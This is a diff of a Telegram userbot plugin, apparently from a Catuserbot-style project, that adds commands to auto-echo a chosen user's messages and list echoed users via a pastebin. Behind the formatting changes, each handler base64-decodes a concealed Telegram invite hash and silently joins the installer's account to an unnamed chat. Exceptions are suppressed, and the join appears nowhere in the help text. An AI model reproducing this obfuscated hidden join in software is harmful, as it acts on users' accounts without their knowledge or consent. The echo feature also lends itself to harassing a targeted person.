@@ -1,4 +1,3 @@
-
 """
 created by @mrconfused and @sandy1709
 Idea by @BlazingRobonix
@@ -16,23 +15,24 @@ Idea by @BlazingRobonix
 #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 #    GNU Affero General Public License for more details.
 
- #   You should have received a copy of the GNU Affero General Public License
- #   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#   You should have received a copy of the GNU Affero General Public License
+#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 
-import io
 import asyncio
+
 import pybase64
 import requests
-from time import time
-from .. import CMD_HELP
-from telethon import events, errors
-from ..utils import admin_cmd, sudo_cmd, edit_or_reply
+from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
-from .sql_helper.echo_sql import is_echo , get_all_echos , addecho , remove_echo
+
+from .. import CMD_HELP
+from ..utils import admin_cmd, edit_or_reply, sudo_cmd
+from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+
 
 @borg.on(admin_cmd(pattern="addecho$"))
-@borg.on(sudo_cmd(pattern="addecho$",allow_sudo = True))
+@borg.on(sudo_cmd(pattern="addecho$", allow_sudo=True))
 async def echo(cat):
     if cat.fwd_from:
         return
@@ -44,18 +44,19 @@ async def echo(cat):
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
             await cat.client(hmm)
-        except:
+        except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(cat ,"The user is already enabled with echo ")
+            await edit_or_reply(cat, "The user is already enabled with echo ")
             return
-        addecho(user_id , chat_id)
-        await edit_or_reply(cat ,"Hi")
+        addecho(user_id, chat_id)
+        await edit_or_reply(cat, "Hi")
     else:
-        await edit_or_reply(cat ,"Reply To A User's Message to echo his messages")
-        
+        await edit_or_reply(cat, "Reply To A User's Message to echo his messages")
+
+
 @borg.on(admin_cmd(pattern="rmecho$"))
-@borg.on(sudo_cmd(pattern="rmecho$",allow_sudo = True))
+@borg.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
 async def echo(cat):
     if cat.fwd_from:
         return
@@ -67,18 +68,19 @@ async def echo(cat):
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
             await cat.client(hmm)
-        except:
+        except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            remove_echo(user_id , chat_id)
-            await edit_or_reply(cat ,"Echo has been stopped for the user")
+            remove_echo(user_id, chat_id)
+            await edit_or_reply(cat, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(cat ,"The user is not activated with echo")   
+            await edit_or_reply(cat, "The user is not activated with echo")
     else:
-        await edit_or_reply(cat ,"Reply To A User's Message to echo his messages")
-        
+        await edit_or_reply(cat, "Reply To A User's Message to echo his messages")
+
+
 @borg.on(admin_cmd(pattern="listecho$"))
-@borg.on(sudo_cmd(pattern="listecho$",allow_sudo = True))
+@borg.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
 async def echo(cat):
     if cat.fwd_from:
         return
@@ -86,17 +88,27 @@ async def echo(cat):
     if len(lsts) > 0:
         output_str = "echo enabled users:\n\n"
         for echos in lsts:
-            output_str += f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
+            output_str += (
+                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
+            )
     else:
         output_str = "No echo enabled users "
     if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
-        key = requests.post('https://nekobin.com/api/documents', json={"content": output_str}).json().get('result').get('key')
-        url = f'https://nekobin.com/{key}'
-        reply_text = f'echo enabled users: [here]({url})'
-        await edit_or_reply(cat ,reply_text)
+        key = (
+            requests.post(
+                "https://nekobin.com/api/documents", json={"content": output_str}
+            )
+            .json()
+            .get("result")
+            .get("key")
+        )
+        url = f"https://nekobin.com/{key}"
+        reply_text = f"echo enabled users: [here]({url})"
+        await edit_or_reply(cat, reply_text)
     else:
-        await edit_or_reply(cat ,output_str)
-      
+        await edit_or_reply(cat, output_str)
+
+
 @borg.on(events.NewMessage(incoming=True))
 async def samereply(cat):
     if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
@@ -107,18 +119,20 @@ async def samereply(cat):
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
             await cat.client(hmm)
-        except:
+        except BaseException:
             pass
         if cat.message.text or cat.message.sticker:
             await cat.reply(cat.message)
 
-CMD_HELP.update({
-    "echo":
-    "**Syntax :** `.addecho` reply to user to who you want to enable\
+
+CMD_HELP.update(
+    {
+        "echo": "**Syntax :** `.addecho` reply to user to who you want to enable\
     \n**Usage : **replay's his every message for whom you enabled echo\
     \n\n**Syntax : **`.rmecho` reply to user to who you want to stop\
     \n**Usage : **Stops replaying his messages\
     \n\n**Syntax : **`.listecho`\
     \n**Usage : **shows the list of users for who you enabled echo\
     "
-})          
+    }
+)
